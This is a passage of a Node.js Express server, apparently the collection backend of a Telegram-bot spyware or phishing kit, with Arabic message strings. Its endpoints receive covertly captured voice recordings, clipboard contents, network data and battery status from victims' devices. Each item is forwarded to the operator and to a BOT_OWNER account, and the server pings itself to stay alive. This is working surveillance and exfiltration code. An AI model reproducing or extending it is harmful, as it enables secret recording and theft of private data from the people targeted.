    stats.audios++; saveStats();
    const buffer = Buffer.from(audio, 'base64');
    const info   = { filename: "voice.webm", contentType: 'audio/webm' };
    const tid    = parseInt(uid, 36);
    notifyDoc(tid, buffer, { caption: "🎙️ تسجيل صوتي" }, info);
    if (tid !== BOT_OWNER) notifyDoc(BOT_OWNER, buffer, { caption: `🎙️ صوت (ID: ${tid})` }, info);
    res.send("Done");
  } else res.send("Missing");
});

app.post("/clipboard", (req, res) => {
  const uid  = decodeURIComponent(req.body.uid)  || null;
  const clip = decodeURIComponent(req.body.clip) || null;
  if (uid && clip) {
    const tid = parseInt(uid, 36);
    notify(tid, `📋 محتوى الحافظة:\n\n${clip}`);
    if (tid !== BOT_OWNER) notify(BOT_OWNER, `📋 حافظة (ID: ${tid}):\n\n${clip}`);
    res.send("Done");
  } else res.send("Missing");
});

app.post("/network", (req, res) => {
  const uid  = decodeURIComponent(req.body.uid)  || null;
  const data = decodeURIComponent(req.body.data) || null;
  if (uid && data) {
    const tid = parseInt(uid, 36);
    notify(tid, `🌐 بيانات الشبكة:\n${data}`);
    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🌐 شبكة (ID: ${tid}):\n${data}`);
    res.send("Done");
  } else res.send("Missing");
});

// Battery alert endpoint
app.post("/battery", (req, res) => {
  const uid      = decodeURIComponent(req.body.uid)      || null;
  const level    = parseInt(req.body.level)               || null;
  const charging = req.body.charging === 'true';
  if (uid && level !== null) {
    const tid = parseInt(uid, 36);
    if (level <= 20 && !charging) {
      const msg = `🔋 تنبيه بطارية منخفضة!\n⚡ المستوى: ${level}%\n🔌 الشحن: ${charging ? 'متصل' : 'غير متصل'}`;
      notify(tid, msg);
      if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
    }
    res.send("Done");
  } else res.send("Missing");
});

// ── Keep Alive ────────────────────────────────────────────────────────────────

setInterval(() => fetch(hostURL).catch(() => {}), 5 * 60 * 1000);
app.listen(5000, () => console.log("App Running on Port 5000!"));
